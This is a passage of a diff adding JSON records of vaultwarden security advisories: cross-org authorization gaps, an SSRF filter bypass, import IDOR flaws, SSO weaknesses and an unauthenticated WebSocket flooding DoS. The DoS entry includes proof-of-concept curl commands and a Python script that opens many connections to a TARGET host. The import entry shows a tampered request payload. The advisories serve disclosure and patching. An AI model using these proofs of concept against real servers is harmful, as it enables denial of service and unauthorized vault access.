+      "summary": "# GitHub Security Advisory (vaultwarden)\r\n\r\nSplit out from the original report, which grouped two primary issues plus a supporting set. The\r\nSSRF and the `post_org_import` gate are tracked separately, see the note at the end.\r\n\r\n- **Ecosystem / package:** Rust / self-hosted server - `dani-garcia/vaultwarden`.\r\n- **Affected versions:** 1.27.0 through 1.36.0.\r\n- **Patched versions:** 1.37.0.\r\n\r\n## Title\r\nCross-org full-access authorization gap in vaultwarden\r\n\r\n## Severity\r\n**AUTHZ (cross-org full access) - Medium.** Reporter's suggested CVSS v3.1\r\n`AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:N` (~7.0, but gated on the non-default `org_groups_enabled` +\r\nknowing target UUIDs -> Medium in practice). Assigned as\r\n`AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N` (5.9), matching the reporter's own \"Medium in practice\"\r\nassessment; `S:U` because both orgs sit under the same authorization component, and `C:L` because\r\nthe attacker obtains ciphertext they cannot decrypt without the org key.\r\n\r\n## CWEs\r\nCWE-863 / CWE-639 (incorrect authorization / IDOR), CWE-862 (missing authorization).\r\n\r\n## Summary\r\nvaultwarden is an internet-exposed, multi-tenant server. An authenticated user who is Admin/Owner of any organization (any user can create one unless `ORG_CREATION_USERS` restricts it) can:\r\n\r\n**Cross-organization full cipher access.** `edit_member` / `send_invite`\r\n(`src/api/core/organizations.rs:1606` / `:1162` in 1.36.0) bind body-supplied group UUIDs to a member with no\r\n`Group::find_by_uuid_and_org` check (unlike the collections loop and `put_group_members`), planting a\r\ncross-org `groups_users` row. Then `Group::is_in_full_access_group` (`src/db/models/group.rs:261`) - the\r\nquery behind `Cipher::get_access_restrictions` - lacks the `groups.organizations_uuid ==\r\nusers_organizations.org_uuid` guard its sibling `get_orgs_by_user_with_full_access` (`group.rs:243`) has,\r\nso that stray row grants full read/write/manage on a foreign org's ciphers to a non-member. Requires\r\n`org_groups_enabled=true` (non-default) and knowing target group + cipher UUIDs (no enumeration).\r\n\r\n## Proof of concept\r\nSource-only, offline, provided privately:\r\n- `poc/poc_authz_cross_org_full_access.py` - SQLite repro of the two Diesel queries: the unguarded\r\n`is_in_full_access_group` grants a non-member cross-org full access, the guarded sibling denies it on\r\nidentical data. (`RESULT_authz_cross_org.txt`)\r\n\r\n## Impact\r\nAn authenticated user who is Admin/Owner of any organization (with the groups feature enabled) can gain full read/write/manage on specific\r\nciphers of an organization they are not a member of. Vault contents remain client-side encrypted\r\nthroughout.\r\n\r\n## Remediation\r\nAdd the org-match join guard to `Group::is_in_full_access_group` (matching\r\n`get_orgs_by_user_with_full_access`) and validate group-org in `edit_member`/`send_invite`.\r\n\r\nBoth were applied in 1.37.0.\r\n\r\n## Split-out issues\r\nThe original report also covered, and the reporter is credited as a finder on both:\r\n- Unauthenticated favicon SSRF bypassing the non-global-IP filter -> GHSA-hw4g-2v3f-74x5\r\n- Read-only collection member injecting ciphers via `post_org_import` -> GHSA-f3qw-qg77-hmm4",
+      "published_at": "2026-10-03T20:04:47.000Z",
+      "modified_at": "2026-10-03T20:04:47.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.9,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:H/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-xwf8-pjh7-h589",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-xwf8-pjh7-h589",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-xwf8-pjh7-h589",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-vh5m-fc9v-m84g",
+      "aliases": [],
+      "title": "SSRF filter bypass (regex not applied post-resolution)",
+      "summary": "### Summary\r\nThe internal-IP SSRF filter can be bypassed in specific non-default configuration. \r\n\r\nWhen an operator disables non-global-IP block (`HTTP_REQUEST_BLOCK_NON_GLOBAL_IPS=false`) and instead relies on `HTTP_REQUEST_BLOCK_REGEX` to keep the server's outbound HTTP client (icon fetching, etc.) away from internal ranges, the regex is **never applied to resolved IP addresses**. An unauthenticated attacker can therefore reach a regex-blocked internal IP by supplying a hostname that resolves to that IP but does not textually match the regex,via unauthenticated `/icons/<host>/icon.png` endpoint.\r\n\r\nDefault installs are **not** affected.\r\n\r\nThis is a residual gap in the same fixes implemented for CVE-2026-47160 / GHSA-72vh-x5jq-m82g (fixed in 1.36.0). That fix closed decimal/hex/octal IP-format bypass which affected the _default_ config. This report is a distinct gap, the regex is not applied post-resolution, that affects _regex-reliance_ config and is present in 1.36.0 and earlier. It is fixed in 1.37.0.\r\n\r\n### Details\r\nThe pre-connect and post-resolution filters are asymmetric.\r\n\r\n`should_block_host()` (src/http_client.rs:135) applies **both** checks to an IP\r\nhost - `should_block_ip()` and `should_block_address_regex()`. But\r\n`post_resolve()` (src/http_client.rs:273) applies **only** `should_block_ip()`:\r\n\r\n    // src/http_client.rs:273 @ tag 1.36.0\r\n    fn post_resolve(name: &str, ip: IpAddr) -> Result<(), CustomHttpClientError> {\r\n        if should_block_ip(ip) {\r\n            Err(CustomHttpClientError::NonGlobalIp { domain: Some(name.to_string()), ip })\r\n        } else {\r\n            Ok(())\r\n        }\r\n    }\r\n\r\n`should_block_ip()` (src/http_client.rs:61) short-circuits to `false` for every\r\nIP when the non-global-IP block is disabled:\r\n\r\n    fn should_block_ip(ip: IpAddr) -> bool {\r\n        if !CONFIG.http_request_block_non_global_ips() {   // default: true\r\n            return false;\r\n        }\r\n        !is_global(ip)\r\n    }\r\n\r\nSo with `http_request_block_non_global_ips=false`, the regex\r\n(`http_request_block_regex`, src/config.rs:703) is the *only* protection for\r\ninternal ranges - yet `resolve_domain()` (src/http_client.rs:241) only runs it\r\nagainst the domain string in `pre_resolve()` (src/http_client.rs:257), never\r\nagainst the resolved IP in `post_resolve()`.\r\n\r\nFor a URL whose host is a domain name, the flow is:\r\n\r\n  1. pre_resolve() -> should_block_host(Host::Domain(name)) -> regex tested\r\n     against the **domain string** only. A hostname that does not textually\r\n     contain the target IP does not match an IP-pattern regex -> pass.\r\n  2. DNS resolves the name to an internal IP.\r\n  3. post_resolve(name, ip) -> should_block_ip(ip) -> false (flag disabled)\r\n     -> regex is never applied to the IP -> allowed.\r\n\r\nThe request then proceeds to the internal IP. In contrast, the same IP supplied\r\nas a literal is caught, because should_block_host() (used for IP-literal hosts\r\nat src/api/icons.rs:123) does apply the regex.\r\n\r\nEntry point: `icon_internal` (src/api/icons.rs:111, `#[get(\"/<host>/icon.png\")]`)\r\nis unauthenticated and drives this outbound fetch through the shared reqwest\r\nclient + custom DNS resolver. Other outbound requests that use the shared\r\nresolver (push relay, HIBP, Duo, version check) were also affected, but their\r\ndestinations are fixed or administrator-configured, so the attacker-reachable\r\nentry point is the unauthenticated icon endpoint.\r\n\r\nAffected source (line numbers per tag 1.36.0, src/http_client.rs unless noted):\r\n  - post_resolve            :273   (root cause - only should_block_ip)\r\n  - should_block_ip         :61    (flag short-circuit)\r\n  - should_block_address_regex :69\r\n  - should_block_host       :135   (correct: both checks)\r\n  - resolve_domain          :241   (pre_resolve + per-IP post_resolve)\r\n  - pre_resolve             :257   (regex on domain string only)\r\n  - icon_internal route     :111   (src/api/icons.rs, unauthenticated)\r\n\r\nSuggested fix (applied in 1.37.0): route the r...",
+      "published_at": "2026-10-03T20:04:31.000Z",
+      "modified_at": "2026-10-03T20:04:31.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:N/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-918"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-vh5m-fc9v-m84g",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-vh5m-fc9v-m84g",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-vh5m-fc9v-m84g",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-f3qw-qg77-hmm4",
+      "aliases": [],
+      "title": "IDOR in Organization Import Allows Unauthorized Data Injection",
+      "summary": "Summary\r\nAn Insecure Direct Object Reference (IDOR) vulnerability in the organization import endpoint allows an authenticated member with \"Read-Only\" permissions to bypass authorization checks and inject unauthorized cipher entries into a restricted collection.\r\n\r\nDetails\r\nThe vulnerability originates from an incorrect authorization check during the organization import process. When the system verifies whether a user can assign imported ciphers to an existing collection, it evaluates the user's visibility (read access) of the collection rather than their writability (manage/write access). Consequently, a user with strictly read-only access successfully passes this validation boundary.\r\n\r\nFurthermore, because the import payload explicitly supplies a list of target collections, a subsequent authorization check intended to verify cipher-level write access is short-circuited. This logical misalignment allows the read-only user's payload to be fully processed, establishing unauthorized relations in the database and mounting new cipher entries into the restricted collection.\r\n\r\nPoC\r\nGeneral replication steps:\r\n\r\nAuthenticate as a standard organization member who is granted strictly \"Read-Only\" access to a specific collection.\r\n\r\nSubmit an HTTP POST request to the /api/ciphers/import-organization?organizationId=<ORG_UUID> endpoint.\r\n\r\nProvide a structured JSON payload containing the target read-only collection's UUID in the collections array, and map a newly defined cipher entry to this collection using the relationships array.\r\n\r\nObserve that the server accepts the payload with an HTTP 200 OK status, successfully mounting the unauthorized cipher into the read-only collection.\r\n\r\nImpact\r\nThis is an Improper Privilege Management flaw affecting multi-user organization vaults.\r\n\r\nNo existing vault data is exposed. However, because every confirmed member holds the organization key, the injected entries can be valid, readable items (for example a login item pointing to an attacker-controlled URL) that other members with access to the collection will see and may trust.\r\n\r\nThis flaw allows low-privileged accounts to inject unauthorized items into shared restricted collections. While these entries can be manually deleted by Organization Admins or Owners, the vulnerability leads to data pollution, UI clutter, and an unnecessary administrative burden to clean up the affected collections.\r\n\r\nPatches\r\nFixed in 1.37.0. Assigning imported items to an existing collection now requires write access to that collection, and the collection list supplied in the import no longer short-circuits the cipher-level write check.\r\n\r\n## Credits\r\n\r\nReported independently by the following researchers, in order of first report:\r\n\r\n1. @gigioneggiando (Luigi Colluto), 2026-07-08, as one item within a broader report, and again by email\r\n2. @GN998, 2026-07-19, the complete standalone analysis this advisory tracks\r\n3. @cipher-creator, Causal Security (https://causalsecurity.com/), by email\r\n\r\nOrdering is listed here because the credits field cannot record it.",
+      "published_at": "2026-10-03T20:04:17.000Z",
+      "modified_at": "2026-10-03T20:04:17.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-f3qw-qg77-hmm4",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-f3qw-qg77-hmm4",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-f3qw-qg77-hmm4",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:70c87274b0f9de254e1c71b390c401ad2fc69cd4c9180d5c1a5e1ad99be62e80",
+      "note": null
+    },
+    {
+      "id": "GHSA-96f7-78q5-j345",
+      "aliases": [],
+      "title": "Unauthenticated WebSocket connection flooding on /notifications/anonymous-hub (resource-exhaustion DoS)",
+      "summary": "# Unauthenticated WebSocket connection flooding on `/notifications/anonymous-hub` (resource-exhaustion DoS)\r\n\r\n## Summary\r\nThe anonymous notifications WebSocket endpoint `GET /notifications/anonymous-hub?token=<...>`\r\naccepts and upgrades WebSocket connections **without any authentication and without any\r\nconnection/rate limit**. Each accepted connection allocates a long-lived async task, an mpsc\r\nchannel, a global-map entry, a periodic timer and a socket/file descriptor, and stays open\r\nindefinitely. A single unauthenticated client can therefore open an unbounded number of\r\npersistent connections and exhaust server resources (tasks, memory, file descriptors),\r\ndegrading or denying the notifications/live-sync service - including the passwordless-login\r\nnotification channel - for all users.\r\n\r\nA secondary issue: the global subscription map is keyed by the **client-supplied `token`** and\r\nuses last-writer-wins `insert`, allowing a client to overwrite (evict) another subscriber that\r\nused the same token.\r\n\r\n## Affected version\r\n- **Vaultwarden 1.36.0 and earlier** (confirmed on 1.36.0, git `f21a3ada`); the endpoint dates back to login-with-device support.\r\n- Fixed in **1.37.0**.\r\n\r\n## Details\r\nSource: `src/api/notifications.rs` (1.36.0)\r\n\r\n```rust\r\n#[get(\"/anonymous-hub?<token..>\")]                                   // line 190 - NO auth guard\r\nfn anonymous_websockets_hub<'r>(ws: WebSocket, token: String, ip: ClientIp)\r\n    -> Result<rocket_ws::Stream!['r], Error> {\r\n    ...\r\n    let (tx, rx) = tokio::sync::mpsc::channel::<Message>(100);        // per-conn channel (buffer 100)\r\n    subscriptions.map.insert(token.clone(), tx);                     // global DashMap, attacker-chosen key\r\n    ...\r\n    // rocket_ws::Stream! { ... interval(Duration::from_secs(15)) ... } // per-conn task + 15s keep-alive timer\r\n}\r\n```\r\n\r\nContrast with the **authenticated** hub `websockets_hub` (line 107), which validates the token\r\nvia `crate::auth::decode_login(&token)` before accepting. `anonymous_websockets_hub` performs no\r\nsuch validation - `token` is an arbitrary attacker-controlled string that is never checked and is\r\nused directly as the subscription-map key.\r\n\r\nPer accepted connection the server allocates:\r\n- one Tokio task running the stream loop,\r\n- one `tokio::sync::mpsc` channel (capacity 100 `Message`s),\r\n- one entry in the process-global `WS_ANONYMOUS_SUBSCRIPTIONS` `DashMap`,\r\n- one 15-second `tokio::time::interval` timer (keep-alive ping → no idle timeout closes the socket),\r\n- one TCP/TLS socket + file descriptor.\r\n\r\nThere is **no authentication, no per-IP connection cap, and no global cap** on these connections.\r\n\r\n## Proof of Concept\r\nTested against a stock `vaultwarden/server:1.36.0` container (default config), no credentials used.\r\n\r\n**1. A single unauthenticated connection is upgraded (arbitrary token, no `Authorization`):**\r\n```bash\r\ncurl -sk -i --http1.1 \\\r\n  -H \"Connection: Upgrade\" -H \"Upgrade: websocket\" \\\r\n  -H \"Sec-WebSocket-Version: 13\" -H \"Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\" \\\r\n  \"http://TARGET:8088/notifications/anonymous-hub?token=$(uuidgen)\"\r\n# -> HTTP/1.1 101 Switching Protocols\r\n```\r\nFor comparison the authenticated hub without a token is rejected:\r\n```bash\r\ncurl ... \"http://TARGET:8088/notifications/hub\"   # -> HTTP/1.1 401 Unauthorized\r\n```\r\n\r\n**2. No connection limit - 60 concurrent connections from a single IP are all accepted:**\r\n```python\r\nimport socket, threading, base64, os\r\nHOST, PORT = \"TARGET\", 8088\r\nok = [0]; socks = []; lock = threading.Lock()\r\ndef one(i):\r\n    s = socket.create_connection((HOST, PORT), timeout=6)\r\n    key = base64.b64encode(os.urandom(16)).decode()\r\n    req = (f\"GET /notifications/anonymous-hub?token={i:08x}-0000-0000-0000-000000000000 HTTP/1.1\\r\\n\"\r\n           f\"Host: {HOST}\\r\\nConnection: Upgrade\\r\\nUpgrade: websocket\\r\\n\"\r\n           f\"Sec-WebSocket-Version: 13\\r\\nSec-WebSocket-Key: {key}\\r\\n\\r\\n\")   # no Authorization\r\n    s.sendall(req.encode())\r\n    if \"101\" in s.recv(...",
+      "published_at": "2026-10-03T20:04:00.000Z",
+      "modified_at": "2026-10-03T20:04:00.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 5.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-400",
+        "CWE-770"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.37.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-96f7-78q5-j345",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-96f7-78q5-j345",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-96f7-78q5-j345",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:adc9ec2d08be2e4c7c4f4842c8084643f143511898bbd8e8bafa89596c76cdc2",
+      "note": null
+    },
+    {
+      "id": "GHSA-jq2g-h4xr-4mcr",
+      "aliases": [],
+      "title": "Cipher Ownership Confusion in Organization Import",
+      "summary": "### Summary\r\n\r\nAn improper authorization issue exists in the organization import endpoint (/api/ciphers/import-organization). While the endpoint validates the target organization specified in the URL query, it fails to enforce that each imported cipher is bound to that organization. A user with organization import permissions can set organizationId at the cipher level to null in the request payload. This causes the imported cipher to be saved to their personal vault while remaining linked to the organization's collection, resulting in inconsistent data ownership and collection mappings between organization and personal vaults.\r\n\r\n### Details\r\n\r\nIn `src/api/core/organizations.rs`, the `post_org_import` function overly trusts external input:\r\n\r\n1. Although the route validates the user's permissions for the target organization via the URL parameter (`query.organization_id`), when iterating through `data.ciphers`, it **does not force `cipher_data.organization_id` to be overwritten with the authenticated `org_id`**. As a result, the system blindly trusts the organization ID provided in the JSON payload.\r\n2. When invoking `update_cipher_from_data(...).await.ok()`, `.ok()` silently suppresses potential business validation errors.\r\n3. Subsequently, the code unconditionally executes `CollectionCipher::save`, forcefully mapping the generated `cipher.uuid` to the target organization's `collection_uuid`.\r\n\r\nWhen an attacker sets `organizationId` to `null`, the cipher item is incorrectly saved to the personal vault while simultaneously being mapped to the organization's collection, breaking physical data isolation.\r\n\r\n### PoC\r\n\r\n**Reproduction Steps:**\r\n\r\n1. Log in with an account that has import permissions for the target organization (e.g., Org B).\r\n2. Initiate an import request to Org B and intercept the HTTP request: `POST /api/ciphers/import-organization?organizationId=<Org_B_UUID>`.\r\n3. Modify the `organizationId` field in the request payload to `null` \r\n\r\n```\r\n  \"body\": JSON.stringify({\r\n    \"ciphers\": [\r\n      {\r\n        \"type\": 1,\r\n        \"encryptedFor\": \"XXXXXXXXXXXXXXXXXXXXX\",\r\n        \"folderId\": null,\r\n        \"organizationId\": null, \r\n```\r\n\r\n4. **Triggered Result**:\r\n* If the payload defines a new collection (only possible for admins and owners), it is created in the target organization.\r\n* A new cipher item appears in the user's **personal vault**. Because the cipher item was encrypted by the client using the organization key prior to upload but erroneously assigned to the personal vault server-side, client-side decryption using the personal key fails, resulting in a ghost entry displaying `[error: cannot decrypt]` in the personal account.\r\n\r\n\r\n### Impact\r\n\r\nAffected Scope: Vaultwarden instances with organization features enabled.\r\n\r\nImpact: This can create inconsistent ownership between imported ciphers and organization collections.\r\n\r\nThe same missing binding also allowed setting the per-cipher `organizationId` to a different organization in which the attacker is any confirmed member (including read-only, with no collection write rights). This created an item owned by that organization, outside of any collection, visible to and decryptable by its owners and admins. The same empty-collection shortcut was reachable via `/ciphers/create` with an empty `collectionIds` list.\r\n<img width=\"395\" height=\"91\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f2028d83-69c6-4160-bf4d-cf4cf35efee4\" />\r\n\r\n### Patches\r\n\r\nFixed in 1.37.0. Organization import now overwrites each item's `organizationId` with the target organization, and an empty collection list is no longer treated as proof of write access.",
+      "published_at": "2026-10-03T20:03:37.000Z",
+      "modified_at": "2026-10-03T20:03:37.000Z",
+      "severity": {
+        "level": "medium",
+        "score": 4.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N",
+        "source": "ghsa"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": null,
+      "cwes": [
+        "CWE-863"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": []
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-jq2g-h4xr-4mcr",
+          "type": "advisory"
+        }
+      ],
+      "sources": [
+        {
+          "type": "ghsa",
+          "id": "GHSA-jq2g-h4xr-4mcr",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-jq2g-h4xr-4mcr",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:70c87274b0f9de254e1c71b390c401ad2fc69cd4c9180d5c1a5e1ad99be62e80",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-47158",
+      "aliases": [
+        "GHSA-pfp2-jhgq-6hg5"
+      ],
+      "title": "Vaultwarden: CSRF in SSO Authorization Flow",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.36.0, Vaultwarden's SSO authorization flow did not bind the OAuth state parameter accepted by /connect/authorize to the initiating browser session, allowed attacker-controlled PKCE parameters, and left SsoAuth records intact after failed token exchange, allowing an unauthenticated attacker to induce IdP authentication and redeem tokens for a fully authenticated session. This issue is fixed in version 1.36.0.",
+      "published_at": "2026-05-19T21:27:43.000Z",
+      "modified_at": "2026-07-15T18:04:27.279Z",
+      "severity": {
+        "level": "high",
+        "score": 8.3,
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:H",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00252,
+        "percentile": 0.16845,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-352"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.36.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-pfp2-jhgq-6hg5",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/pull/7163",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/commit/d297e274a35dccd0f5d935e9d5934e0f7e9c0a87",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.36.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-47158",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-47158",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-47158",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-47158",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-pfp2-jhgq-6hg5",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-pfp2-jhgq-6hg5",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:10c507711962d860abecf1ccd443d1e982c7bfaf940c3e2ffe8b5b0a5270009b",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-47159",
+      "aliases": [
+        "GHSA-hxqh-ff5p-wfr3"
+      ],
+      "title": "Vaultwarden: Authentication Flow Information Disclosure in SSO Discovery Allows Organization Enumeration and Pre-Validation Token Exposure",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.36.0, Vaultwarden's SSO discovery and pre-validation flow returned organization-related SSO metadata including organizationIdentifier values for arbitrary email addresses and allowed a valid pre-validation JWT to be obtained with only the discovered identifier, enabling SSO-enabled organization enumeration and authentication workflow abuse. This issue is fixed in version 1.36.0.",
+      "published_at": "2026-05-19T21:27:39.000Z",
+      "modified_at": "2026-07-15T15:34:11.312Z",
+      "severity": {
+        "level": "medium",
+        "score": 6.9,
+        "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00468,
+        "percentile": 0.41051,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-287"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.36.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-hxqh-ff5p-wfr3",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/pull/7163",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/commit/d297e274a35dccd0f5d935e9d5934e0f7e9c0a87",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.36.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-47159",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-47159",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-47159",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-47159",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-hxqh-ff5p-wfr3",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-hxqh-ff5p-wfr3",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:bd9ba72d8abb37b45f690876e88a920359932eb978d621f4e0c0d05a0c962a3d",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-47164",
+      "aliases": [
+        "GHSA-6x5c-84vm-5j56"
+      ],
+      "title": "Vaultwarden: SSO Email Auto-Link Can Bind an Existing Local Account to an Attacker-Controlled IdP Identity",
+      "summary": "Vaultwarden is a Bitwarden-compatible server written in Rust. Prior to 1.36.0, Vaultwarden's SSO login flow checked the IdP email_verified claim only for new-user creation and not when SSO_SIGNUPS_MATCH_EMAIL=true linked an IdP identity to an existing local account, allowing an attacker-controlled IdP identity asserting a victim email address to bind to and authenticate as that account. This issue is fixed in version 1.36.0.",
+      "published_at": "2026-05-19T21:27:33.000Z",
+      "modified_at": "2026-07-15T15:41:17.392Z",
+      "severity": {
+        "level": "high",
+        "score": 7.7,
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L",
+        "source": "cna"
+      },
+      "kev": {
+        "listed": false,
+        "added_at": null,
+        "checked": true
+      },
+      "epss": {
+        "score": 0.00448,
+        "percentile": 0.39449,
+        "date": "2026-11-15"
+      },
+      "cwes": [
+        "CWE-284"
+      ],
+      "affected": [
+        {
+          "product": "vaultwarden",
+          "ranges": [
+            {
+              "introduced": "0",
+              "fixed": "1.36.0"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-6x5c-84vm-5j56",
+          "type": "advisory"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/pull/7163",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/commit/d297e274a35dccd0f5d935e9d5934e0f7e9c0a87",
+          "type": "fix"
+        },
+        {
+          "url": "https://github.com/dani-garcia/vaultwarden/releases/tag/1.36.0",
+          "type": "release-notes"
+        }
+      ],
+      "sources": [
+        {
+          "type": "cve-cna",
+          "id": "CVE-2026-47164",
+          "url": "https://www.cve.org/CVERecord?id=CVE-2026-47164",
+          "license": "CVE-TOU"
+        },
+        {
+          "type": "epss",
+          "id": "CVE-2026-47164",
+          "url": "https://api.first.org/data/v1/epss?cve=CVE-2026-47164",
+          "license": "FIRST-EPSS"
+        },
+        {
+          "type": "ghsa",
+          "id": "GHSA-6x5c-84vm-5j56",
+          "url": "https://github.com/dani-garcia/vaultwarden/security/advisories/GHSA-6x5c-84vm-5j56",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "revision": "sha256:10c507711962d860abecf1ccd443d1e982c7bfaf940c3e2ffe8b5b0a5270009b",
+      "note": null
+    },
+    {
+      "id": "CVE-2026-47160",
+      "aliases": [
+        "GHSA-72vh-x5jq-m82g"
+      ],
+      "title": "Vaultwarden: Server-side request forgery (SSRF) via Icon Endpoint Decimal/Hex/Octal IP Bypass",
